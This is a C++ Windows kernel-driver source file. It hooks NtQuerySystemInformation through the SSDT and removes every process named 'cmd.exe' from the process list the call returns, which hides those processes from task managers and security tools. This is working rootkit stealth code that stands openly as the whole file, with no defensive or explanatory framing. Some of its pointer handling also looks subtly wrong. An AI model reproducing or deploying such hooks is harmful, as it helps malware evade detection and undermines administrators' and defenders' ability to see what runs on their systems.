#include "ZwQuerySystemInformationHooks.h"


extern "C"  NTSTATUS NtQuerySystemInformationHook_HideProcess(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{    
    auto hookData = SSDTHookManagaer::getInstance().GetHookByAddres(reinterpret_cast<ULONG_PTR>(&NtQuerySystemInformationHook_HideProcess));
    NT_QUERY_SYSTEM_INFORMATION originalFunc = reinterpret_cast<NT_QUERY_SYSTEM_INFORMATION>(hookData.OriginalFunc);
        
    auto status = originalFunc(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessesAndThreadsInformation)
    {
        SYSTEM_PROCESS* currentProcEntry = ((SYSTEM_PROCESS*)SystemInformation);
        SYSTEM_PROCESS* previousProcEntry = NULL;
        while (currentProcEntry)
        {
            if (currentProcEntry->ProcessName.Buffer)
            {
                if (wcsstr(currentProcEntry->ProcessName.Buffer, L"cmd.exe"))
                {                    
                    if (previousProcEntry)
                    {
                        if (currentProcEntry->NextEntryDelta)
                        {
                            previousProcEntry->NextEntryDelta += currentProcEntry->NextEntryDelta;
                        }
                        else
                        {
                            previousProcEntry->NextEntryDelta = 0;
                        }
                    }
                    else
                    {
                        if (currentProcEntry->NextEntryDelta)
                        {
                            ULONG sizeNext;
                            SYSTEM_PROCESS* next = reinterpret_cast<SYSTEM_PROCESS*>((PBYTE)currentProcEntry + currentProcEntry->NextEntryDelta);

                            next->NextEntryDelta += currentProcEntry->NextEntryDelta;

                            sizeNext = sizeof(SYSTEM_PROCESS) + (sizeof(SYSTEM_THREADS) * (next->ThreadCount - 1));

                            SystemInformation = (PBYTE)SystemInformation + currentProcEntry->NextEntryDelta;

                            memcpy(currentProcEntry, next, sizeNext);
                        }
                        else
                        {
                            memset(currentProcEntry, 0, sizeof(SYSTEM_PROCESS) + (sizeof(SYSTEM_THREADS) * (currentProcEntry->ThreadCount - 1)));
                        }
                    }
                }
            }
            previousProcEntry = currentProcEntry;
            if (currentProcEntry->NextEntryDelta)
            {
                currentProcEntry = reinterpret_cast<SYSTEM_PROCESS*>((PBYTE)currentProcEntry + currentProcEntry->NextEntryDelta);
            }
            else
            {
                currentProcEntry = NULL;
            }
        }
    }
    
    return status;
}